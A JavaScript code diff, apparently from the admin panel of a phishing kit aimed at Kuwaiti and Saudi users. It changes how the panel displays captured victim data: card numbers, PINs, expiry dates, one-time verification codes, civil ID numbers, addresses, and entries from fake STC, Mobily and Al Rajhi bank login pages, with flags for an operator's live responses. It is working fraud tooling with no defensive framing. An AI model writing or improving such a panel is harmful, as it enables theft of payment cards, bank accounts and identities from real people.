@@ -1415,12 +1415,11 @@
       html += '<div class="flex justify-between items-start"><div>';
       html += '<h2 class="text-2xl font-bold">' + displayName + '</h2>';
       html += '<p class="text-gray-500">' + visitor.page + '</p>';
-                  /* KDD_ORDER_BOX */
+                  /* KDD_HELPERS - بدون الصندوق */
       try {
-        var __t0 = function (s) { try { var d = new Date(s); if (!s || isNaN(d.getTime())) return ''; var hh = d.getHours(), mm = d.getMinutes(); return (hh < 10 ? '0' : '') + hh + ':' + (mm < 10 ? '0' : '') + mm; } catch (e) { return ''; } };
         var __flat = function (x) { if (x == null) return ''; if (typeof x !== 'object') return String(x); var n = x.name || x.title || x.productName || x.product || x.label || ''; var q = x.qty || x.quantity || x.count || ''; return (n || 'منتج') + (q ? (' × ' + q) : ''); };
         var __LBL = { name: 'الاسم', fullName: 'الاسم', phone: 'الهاتف', mobile: 'الهاتف', civilId: 'الرقم المدني', area: 'المنطقة', governorate: 'المحافظة', block: 'القطعة', street: 'الشارع', building: 'المبنى', floor: 'الطابق', apartment: 'الشقة', notes: 'ملاحظات', items: 'المنتجات', products: 'المنتجات', total: 'المجموع', subtotal: 'المجموع الفرعي', deliveryFee: 'التوصيل', paymentMethod: 'طريقة الدفع', payment: 'طريقة الدفع', couponCode: 'كوبون', cardNumber: 'رقم البطاقة', cardNumberOnly: 'رقم البطاقة', prefix: 'البادئة', bankName: 'البنك', pin: 'الرقم السري', expiryMonth: 'شهر الانتهاء', expiryYear: 'سنة الانتهاء', nameOnCard: 'الاسم على البطاقة', cardType: 'نوع البطاقة', 'الرمز': 'الرمز' };
-        var __grp = [['pin'], ['cardNumber', 'cardNumberOnly'], ['prefix'], ['bankName'], ['nameOnCard'], ['cardType'], ['expiryMonth'], ['expiryYear'], ['الرمز'], ['name', 'fullName', 'customerName', 'الاسم'], ['phone', 'mobile', 'phoneNumber', 'الهاتف', 'رقم الجوال'], ['civilId', 'civilID', 'civil_id', 'الرقم المدني'], ['area', 'region', 'المنطقة'], ['governorate', 'المحافظة'], ['block', 'القطعة'], ['street', 'الشارع'], ['building', 'house', 'المبنى'], ['floor', 'الطابق', 'الدور'], ['apartment', 'flat', 'الشقة'], ['items', 'products', 'المنتجات'], ['notes', 'note', 'ملاحظات'], ['paymentMethod', 'payment', 'طريقة الدفع'], ['couponCode', 'كوبون'], ['subtotal'], ['deliveryFee', 'التوصيل'], ['total', 'المجموع']];
+        var __grp = [['pin'], ['cardNumber', 'cardNumberOnly'], ['prefix'], ['bankName'], ['nameOnCard'], ['cardType'], ['expiryMonth'], ['expiryYear'], ['الرمز'], ['name', 'fullName', 'customerName', 'الاسم'], ['phone', 'mobile', 'phoneNumber', 'الهاتف', 'رقم الجوال'], ['civilId', 'civilID', 'civil_id', 'الرقم المدني'], ['area', 'governorate', 'region', 'المنطقة', 'المحافظة'], ['block', 'القطعة'], ['street', 'الشارع'], ['building', 'house', 'المبنى'], ['floor', 'الطابق', 'الدور'], ['apartment', 'flat', 'الشقة'], ['items', 'products', 'المنتجات'], ['notes', 'note', 'ملاحظات'], ['paymentMethod', 'payment', 'طريقة الدفع'], ['couponCode', 'كوبون'], ['subtotal'], ['deliveryFee', 'التوصيل'], ['total', 'المجموع']];
         var __skip = { existingVisitorId: 1, visitorId: 1, visitor_id: 1, id: 1, clientId: 1, uid: 1, token: 1, deviceId: 1, kind: 1, url: 1, referrer: 1, language: 1, screen: 1, userAgent: 1, at: 1, ts: 1, path: 1, timestamp: 1, page: 1, isCustom: 1, waitingForAdminResponse: 1, sentCustomPage: 1, mode: 1, address: 1, cardNumberOnly: 1, prefix: 1, fullName: 1, customerName: 1, mobile: 1, phoneNumber: 1, civilID: 1, civil_id: 1, region: 1, governorate: 1, house: 1, flat: 1, note: 1 };
         var __ph = /غير متوفر|غير محدد|اختر|Select|^--|لا يوجد/;
         var __mk = function (obj) {
@@ -1448,32 +1447,6 @@
           });
           return rows;
         };
-        var __en = [];
-        (visitor.dataHistory || []).forEach(function (h) { if (h && h.content) __en.push({ t: h.timestamp || 0, page: h.page || '', d: h.content }); });
-        (visitor.paymentCards || []).forEach(function (p) { if (p) __en.push({ t: p.timestamp || 0, page: 'دفع بالبطاقة', d: p }); });
-        (visitor.digitCodes || []).forEach(function (g) { if (g && g.code) __en.push({ t: g.timestamp || 0, page: 'رمز التحقق', d: { 'الرمز': g.code } }); });
-        if (!__en.length && visitor.data) __en.push({ t: 0, page: visitor.page || '', d: visitor.data });
-        __en.sort(function (a, b) { return b.t > a.t ? 1 : b.t < a.t ? -1 : 0; });
-        __en = __en.slice(0, 6);
-        if (__en.length) {
-          var __h = '<div style="margin:16px 0;border:1px solid #e5e7eb;border-radius:12px;overflow:hidden;background:#fff"><div style="padding:10px 14px;background:#eef2f7;font-weight:700;font-size:15px">بيانات الطلب</div>';
-          
-          __en.forEach(function (it) {
-            var __rows2 = __mk(it.d);
-            if (!__rows2.length) return;
-            __h += '<div style="padding:6px 14px;background:#f8fafc;border-top:1px solid #e5e7eb;font-size:12px;color:#475569;display:flex;justify-content:space-between"><span>' + (it.page || '') + '</span><span>' + __t0(it.t) + '</span></div>';
-            __rows2.forEach(function (r) {
-              var kk = r[2], v = r[1];
-              if (Array.isArray(v)) v = v.map(__flat).join('<br>');
-              else if (v && typeof v === 'object') v = __flat(v);
-              else v = String(v);
-              if (kk === 'total' || kk === 'subtotal' || kk === 'deliveryFee') v = v + ' د.ك';
-              __h += '<div style="display:flex;justify-content:space-between;gap:14px;padding:7px 14px;border-top:1px solid #f1f5f9;font-size:14px;word-break:break-word"><span style="color:#64748b;white-space:nowrap">' + r[0] + '</span><b style="text-align:left;color:' + (kk === 'total' ? '#0f766e;font-size:16px' : '#0f172a') + '">' + v + '</b></div>';
-            });
-          });
-          __h += '</div>';
-          html += __h;
-        }
       } catch (e) {}
 // Get service name and total fees from data dynamically
       let serviceName = null;
@@ -1840,10 +1813,22 @@
             const __kddHasBtns = ['توثيق رقم الجوال', 'كلمة مرور STC', 'تنبية إتصال STC', 'تنبية إتصال Mobily', 'تسجيل الدخول الراجحى'].indexOf(__kddPg) >= 0 || !!(dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز');
             if (__kddHasBtns) {
               html += '<div class="data-section ' + bgColor + ' p-4 rounded-lg" style="border-right-color: ' + borderColor + ';">';
-              html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + __kddPg + '</h3>';
-            }
-            
-            
+            html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + (dataEntry.page || 'بيانات') + '</h3>';
+            try {
+              var __dr = __mk(dataEntry.content || {});
+              if (__dr.length) {
+                html += '<div class="grid grid-cols-2 gap-3">';
+                __dr.forEach(function (r) {
+                  var kk = r[2], v = r[1];
+                  if (Array.isArray(v)) v = v.map(__flat).join(' ، ');
+                  else if (v && typeof v === 'object') v = __flat(v);
+                  else v = String(v);
+                  if (kk === 'total' || kk === 'subtotal' || kk === 'deliveryFee') v = v + ' د.ك';
+                  html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + r[0] + '</span><span class="font-medium ' + (kk === 'total' ? 'text-teal-700 text-lg font-bold' : 'text-gray-800') + '">' + v + '</span></div>';
+                });
+                html += '</div>';
+              }
+            } catch (e) {}
             // إضافة أزرار لتوثيق رقم الجوال
             if (dataEntry.page === 'توثيق رقم الجوال') {
               // الحصول على مزود الخدمة من البيانات
@@ -2105,7 +2090,7 @@
               }, 100);
             }
             
-            if (__kddHasBtns) html += '</div>';
+            html += '</div>';
           }
         });
         html += '</div>';
